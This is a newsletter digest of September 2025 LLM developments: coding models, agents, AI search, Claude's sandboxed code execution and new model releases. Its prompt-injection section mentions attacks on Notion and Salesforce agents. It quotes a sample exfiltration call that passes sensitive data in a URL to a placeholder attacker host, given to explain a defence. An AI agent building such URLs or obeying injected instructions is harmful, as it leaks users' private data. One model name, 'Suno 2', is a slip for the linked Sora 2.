# LLM digest: September 2025

I published [73 posts](https://simonwillison.net/2025/Sep/) on my blog in September. Here's your sponsors-only summary of the most important trends and highlights from the past month.

## Best model for code? GPT-5-Codex... then Claude 4.5 Sonnet

At the start of the month the best model for code was about an even competition between [GPT-5](https://simonwillison.net/2025/Aug/7/gpt-5/) and [Claude Opus 4.1](https://simonwillison.net/2025/Aug/5/claude-opus-41/).

On September 15th OpenAI [released a new code-specific model](https://simonwillison.net/2025/Sep/15/gpt-5-codex/), GPT-5-Codex, initially available mainly through their upgraded Codex CLI tool (and later [their API](https://simonwillison.net/2025/Sep/23/gpt-5-codex/)). It was *really* good - it became my favorite model for coding tasks, and Codex CLI overtook Claude Code as my default coding agent of choice.

That lasted all of two weeks: on September 29th Anthropic [released Claude Sonnet 4.5](https://simonwillison.net/2025/Sep/29/claude-sonnet-4-5/), boldly claiming it to be "the best coding model in the world". My impressions so far are that it lives up to that label. They also upgraded Claude Code.

How long will Anthropic keep that crown? Google's Gemini 3.0 is heavily rumored to drop in October, so maybe just a few weeks before the best coding model changes hands one again.

## I've grudgingly accepted a definition for "agent"

I've been refusing to use the term "agent" for over a year now, out of frustration that there was no definition that was widespread enough for me to be confident that people I was talking to would know what I mean by it.

I think one definition has climbed far enough away from the pack to be useful now. I'm choosing to use agent to mean an LLM system that **runs tools in a loop to achieve a goal**.

I wrote more about how I came to accept this definition in [I think “agent” may finally have a widely enough agreed upon definition to be useful jargon now](https://simonwillison.net/2025/Sep/18/agents/).

Having a definition is useful because now I can start writing more about this shape of agent! This morning I published [Designing agentic loops](https://simonwillison.net/2025/Sep/30/designing-agentic-loops/), describing a key skill that I think is worth focusing on to get the best results out of coding agents like Claude Code and Codex CLI. If you can reduce a problem to a **clear success criteria** and provide a safe environment with the **right available tools** you can have the agent brute force a solution to many different categories of problem. 

## GPT-5 Research Goblin and Google AI Mode

One of the most exciting features of GPT-5 Thinking is its exceptional ability to search the web. I wrote about that in [GPT-5 Thinking in ChatGPT (aka Research Goblin) is shockingly good at search](https://simonwillison.net/2025/Sep/6/research-goblin/), including examples of some pretty complex research tasks and tips on getting good results. Then I realized that Google's new AI Mode - which I had low expectations for thanks to their terrible AI Overviews - was [also extremely competent](https://simonwillison.net/2025/Sep/7/ai-mode/)!

A year ago I would have told you that using LLMs for search - even tools which could make calls out to a real search engine - was a terrible idea. Today, to my surprise, ChatGPT has won me over as my default search engine for all but the simplest of navigational queries.

## Claude has Code Interpreter now

ChatGPT's Code Interpreter tool - where the model can execute Python code in a secure sandbox as part of responding to a prompt - has been one of my favorite AI tools since its initial launch back in early 2023.

Anthropic's Claude (web only for the moment) finally caught up on September 9th. They added the ability for Claude to run both Python *and* Node.js in a container, and unlike ChatGPT their container also has the ability to install additional packages from PyPI and NPM and checkout code from GitHub.

They didn't call it Code Interpreter - they called it "Upgraded file creation and analysis" instead. I wrote about it at length in [My review of Claude’s new Code Interpreter, released under a very confusing name](https://simonwillison.net/2025/Sep/9/claude-code-interpreter/).

If you want to try it out be aware that you have to [turn it on in your settings](https://simonwillison.net/2025/Sep/9/claude-code-interpreter/#switching-it-on-in-settings-features) first.

Coincidentally it came out a day after I published a detailed guide to using ChatGPT Code Interpreter with GPT-5: [Recreating the Apollo AI adoption rate chart with GPT-5, Python and Pyodide](https://simonwillison.net/2025/Sep/9/apollo-ai-adoption/). I took a screenshot of a complex chart and an uploaded Excel sheet from the US Census and had GPT-5 recreate the chart for me. I was very impressed with how well this worked, and then found that Claude 4 was able to [achieve a similar result](https://simonwillison.net/2025/Sep/9/claude-code-interpreter/#something-much-harder-recreating-the-ai-adoption-chart) using its new Code Interpreter feature.

The new Sonnet 4.5 is even *better* at using this tool! Here's [my description](https://simonwillison.net/2025/Sep/29/claude-sonnet-4-5/#it-really-shines-with-claude-ai-code-interpreter) of having Claude checkout one of my GitHub repos, run the tests and then propose a significant refactor to the database schema... all prompted from a browser on my phone.

## The lethal trifecta in the Economist

The Economist interviewed me for a piece on the [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) class of prompt injection attacks, and published a story [Why AI systems might never be secure](https://simonwillison.net/2025/Sep/23/why-ai-systems-might-never-be-secure/) which I think is the most accurate depiction yet of the threat of prompt injection by a mainstream publication.

Meanwhile, new lethal trifecta attacks were reported [against Notion 3.0](https://simonwillison.net/2025/Sep/19/notion-lethal-trifecta/) and [Salesforce AgentForce](https://simonwillison.net/2025/Sep/26/agentforce/). Clearly those teams should read the Economist!

Claude's [new web_fetch tool](https://simonwillison.net/2025/Sep/10/claude-web-fetch-tool/) taught me a clever new protection against data exfiltration attacks: Claude will only fetch a URL that has been directly entered by a user or retrieved from the search tool - it won't fetch URLs that the model itself concatenated together. This prevents the extremely common `web_fetch("http://attacker.evil.com/?data=<<sensitive data>>")` style of exfiltration vector.

## Other significant model releases

I rendered pelicans riding bicycles for most of these, click through for each one:

- [Kimi-K2-Instruct-0905](https://simonwillison.net/2025/Sep/6/kimi-k2-instruct-0905/) from Moonshot AI in China is an incremental improvement over the excellent Kimi K2, a huge trillion parameter model now supporting 256,000 token context length (up from 128,000).
- [Qwen3-Next-80B-A3B](https://simonwillison.net/2025/Sep/12/qwen3-next/) comes in both thinking and non-thinking variants. At 80B it fits on a single GPU but Qwen claim its performance is comparable to their much larger Qwen3-235B model.
- [Magistral Small 1.2 and Magistral Medium 1.2](https://simonwillison.net/2025/Sep/19/magistral/) are Mistral's first reasoning models with vision capabilities. Small is Apache 2.0 licensed, Medium is API-only.
- [Grok 4 Fast](https://simonwillison.net/2025/Sep/20/grok-4-fast/) is xAI's new competitively priced vision-enabled reasoning model.
- Qwen released [FP8 versions of Qwen3-Next-80B, Qwen3-TTS-Flash for speech synthesis, Qwen3-Omni 30B multi-model image/audio/text input and text/audio output, and Qwen-Image-Edit-2509](https://simonwillison.net/2025/Sep/22/qwen/) all on the same day! The Omni model (Apache 2.0 licensed) is particularly exciting.
- ... and then a day later Qwen released [Qwen3-VL-235B-A22B](https://simonwillison.net/2025/Sep/23/qwen3-vl/), their largest open weight vision model. Plus API-only Qwen 3 Coder, Qwen3-LiveTranslate-Flash (real-time multimodal interpretation), and Qwen3-Max (their new flagship).
- Google released [improved versions of Gemini 2.5 Flash and Flash Lite](https://simonwillison.net/2025/Sep/25/improved-gemini-25-flash-and-flash-lite/), their fast-and-cheap models for the 2.5 family.

## Notable AI success stories

Some notable success stories this month:

- Both OpenAI and Google Gemini achieved gold medal performances in the International Collegiate Programming Contest (ICPC). This is notable because the ICPC problems are designed to be challenging for human competitors and, crucially, they are not in any model training data. [I wrote about this here](https://simonwillison.net/2025/Sep/17/icpc/).
- Quantum physicist Scott Aaronson [used GPT-5 to help him prove "oracle separations between quantum complexity classes"](https://simonwillison.net/2025/Sep/29/scott-aaronson/).
- Armin Ronacher wrote about [having Claude write 90% of the code](https://simonwillison.net/2025/Sep/29/armin-ronacher-90/) for a major new infrastructure component for his startup. Most of the "90% of the code" claims to date have come from AI vendors who lack credibility, but Armin is a very established figure in the open source world so this is worth paying attention to.

## Video models are zero-shot learners and reasoners

Google DeepMind published a fascinating paper this month: [Video LLMs are Zero-Shot Learners and Reasoners](https://simonwillison.net/2025/Sep/27/video-models-are-zero-shot-learners-and-reasoners/). It makes a very convincing case that their Veo 3 model - and generative video models in general - serve a similar role in the machine learning visual ecosystem as LLMs do for text. One model can solve all kinds of computer vision tasks based on image inputs and prompts alone.

OpenAI [shipped their Suno 2 model](https://simonwillison.net/2025/Sep/30/sora-2/) this morning, emphasizing its ability to generate audio in addition to video and with a "cameo" feature that makes it easy for people to drop themselves, their family and their friends into the videos they generate.

## Tools I'm using at the moment

I'm spending a *lot* of time in ChatGPT, specifically in GPT-5 Thinking for search and research tasks. I fire off a dozen or more of these today - things like "which video generation AI model first added audio? One of the Veo ones?".

I've switched from ChatGPT Code Interpreter to Claude Code Interpreter, thanks to its support for installing additional packages.

I'm using Codex CLI and Claude Code in equal amounts right now - they are both *excellent* - a significant upgrade on a month ago. Honestly I don't have a preference - I'm switching between them mainly to try and get a feel for which one is most competent at which tasks.

I kick off tasks on Codex Cloud once or twice a day now. I like that it can take a task, checkout code, install dependencies and generally noodle on problems in the background and give me a clear answer or PR once it's done.

I haven't been running many local models this month, but I'm still defaulting to LM Studio when I do. I like it's support for both GGUF and MLX models and frequently updated [model catalog](https://lmstudio.ai/models).

## Other bits and pieces

- I wrote about [my most interesting LLM-generated tools](https://simonwillison.net/2025/Sep/4/highlighted-tools/) that I've created for my [tools.simonwillison.net](https://tools.simonwillison.net) site. That side also now has a search feature that was [entirely built using Codex Cloud and Codex CLI](https://github.com/simonw/tools/commits/main/homepage-search.js).
- GitHub launched [Copilot CLI](https://simonwillison.net/2025/Sep/25/github-copilot-cli/), their take on the Claude Code / Codex CLI coding agent pattern.
- Anthropic [settled their pirated ebook case for $1.5bn](https://simonwillison.net/2025/Sep/6/anthropic-settlement/).
- Google's antitrust case [came to an end as well](https://simonwillison.net/2025/Sep/3/antitrust/), and it looks like they won't be selling Chrome or cutting of Mozilla's funding.
- Anthropic published [an interesting postmortem](https://simonwillison.net/2025/Sep/17/anthropic-postmortem/) about model performance serving bugs that affected their platform in August and September.

## That's it for September!

If this newsletter was useful feel free to forward it to friends who might find it useful too, especially if they might be convinced to sign up to sponsor me for the next one!

Thanks for your support,

Simon Willison - [simonwillison.net](https://simonwillison.net/)

I'm available for consulting calls over Zoom or similar, you can contact me at contact@simonwillison.net
